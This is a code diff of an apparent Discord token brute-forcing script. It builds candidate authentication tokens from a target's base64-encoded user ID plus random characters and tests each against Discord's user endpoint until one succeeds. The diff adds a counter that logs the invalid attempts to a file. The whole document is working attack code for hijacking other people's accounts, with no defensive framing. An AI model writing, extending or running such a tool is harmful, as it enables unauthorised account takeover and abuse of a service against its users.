@@ -24,15 +24,18 @@ def bruteforce():
         id_decode = id_encodeb64.decode("UTF-8")
         request_url = "https://discordapp.com/api/v6/users/@me"
         x = datetime.datetime.now()
-        print(system_prefix + f"Started at {x.minute}:{x.second}")
+        print(system_prefix + f"Started...\n\n{Fore.RED} It may take more or less, depending on your internet.\n")
+        number = 0
         while True:
             try:
                 list_ca = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                 token = id_decode + ('').join(random.choices(list_ca, k=35))
-
+                number += 1
                 headers = {'Authorization': token, 'Content-Type': 'application/json'}  
                 respuesta = requests.get(request_url, headers=headers)
-
+                file_x = open("INVALID.TXT", "w+")
+                file_x.write(f">\n{number} Tokens Generated Invalid\n>")
+                file_x.close()
                 if respuesta.status_code == 200:
                     print(system_prefix + "COMPLETE - " + token)
                     messagebox.showinfo(message=f"BRUTEFORCE COMPLETE", title="Token Bruteforce | Developed By Tahg - GitHub: https://github.com/T4hg/")
